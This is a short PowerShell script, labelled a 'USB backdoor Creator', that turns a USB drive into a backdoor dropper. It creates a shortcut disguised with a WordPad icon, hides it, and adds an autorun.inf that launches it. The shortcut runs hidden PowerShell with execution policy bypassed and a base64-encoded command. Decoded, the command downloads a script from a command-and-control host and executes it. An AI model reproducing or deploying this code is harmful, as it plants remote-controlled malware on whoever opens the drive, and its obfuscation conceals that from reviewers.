# USB backdoor Creator - USB WMI event is monitored and once USB is connected, this script is executed inside the USB and create backdoor. 
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("Disk.lnk")
$Shortcut.iconlocation = "C:\Program Files\Windows NT\Accessories\wordpad.exe"
$Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$Shortcut.arguments = "-Exec Bypass -Nop -sta -W Hidden -Enc SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAJABjADIAYwAvACQAcgBvAG8AdABmAG8AbABkAGUAcgAvAGwAaQBuAGsALwBwAG4AdAAuAHAAcwAxACIAKQApAA==
 "
$Shortcut.Save()
#move $USBDrive\* $USBDrive\container
# Hide folder
attrib +h Disk.lnk
$inf = @"
[AutoRun]
open=Disk.lnk
icon=%SystemRoot%\system32\SHELL32.dll,8
shellexecute=Disk.lnk
UseAutoPlay=1
"@
set-content .\autorun.inf -Value $inf
